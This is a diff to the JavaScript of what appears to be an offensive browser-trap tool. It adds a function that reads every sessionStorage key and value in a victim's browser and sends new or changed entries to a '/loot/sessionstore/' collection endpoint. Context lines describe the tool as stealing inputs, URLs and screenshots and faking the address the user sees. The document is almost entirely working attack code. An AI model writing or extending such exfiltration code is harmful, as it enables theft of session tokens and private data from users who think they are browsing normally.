@@ -40,11 +40,15 @@ let loaded = false;
 var sessionName = "";
 
 // Cookie storage
-var cookieStorageDict ={};
+var cookieStorageDict = {};
 
 
 // Local storage
 var localStorageDict = {};
+
+
+// Session storage
+var sessionStorageDict = {};
 
 
 // Values for client session identifiers
@@ -327,6 +331,59 @@ function checkLocalStorage()
 }
 
 
+
+// Check for session storage data, see if values
+// have been added or changed
+// Only update backend if new data or value changed.
+function checkSessionStorage()
+{
+	for (index = 0; index < sessionStorage.length; index++)
+	{
+		key = sessionStorage.key(index)
+		value = sessionStorage.getItem(key)
+		// console.log("~~~ Session storage: {" + key + ", " + value + "}");
+
+		if (key in sessionStorageDict)
+		{
+			// Existing local storage key
+			//console.log("!!! Existing localstorage key...");
+			if (sessionStorageDict[key] != value)
+			{
+				// Existing localStorage, but the value has changed
+				 // console.log("     New sessionStorage value: " + value);
+				 // console.log("     Old sessionStorage value: " + sessionStorageDict[key]);
+				sessionStorageDict[key] = value;
+			}
+			else
+			{
+				// Existing sessionStorage, but no change in value to report
+				// console.log("     sessionStorage value unchanged");
+				continue;
+			}
+
+		}
+		else
+		{
+			// New localStorage entry
+			// console.log("++ New sessionStorage: " + key + ", with value: " + value);
+			sessionStorageDict[key] = value;
+		}
+
+
+		// Ship it
+		request = new XMLHttpRequest();
+		request.open("POST", "http://localhost:8444/loot/sessionstore/" + sessionName);
+		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+		var jsonObj = new Object();
+		jsonObj["key"] = key;
+		jsonObj["value"] = value;
+		var jsonString = JSON.stringify(jsonObj);
+		request.send(jsonString);
+	}
+}
+
+
+
 // When this update fires, it checks the iframe trap URL
 // where the user thinks they are, then does a lot of things
 // Steals inputs, URL, screenshots, etc. 
@@ -384,6 +441,11 @@ function runUpdate()
 	// Check local storage
 	// Will only report when new or changed data found
 	checkLocalStorage();
+
+
+	// Check session storage
+	// Will only report when new or changed data found
+	checkSessionStorage();
 
 
 	// Fake the URL that the user sees. This is important. 
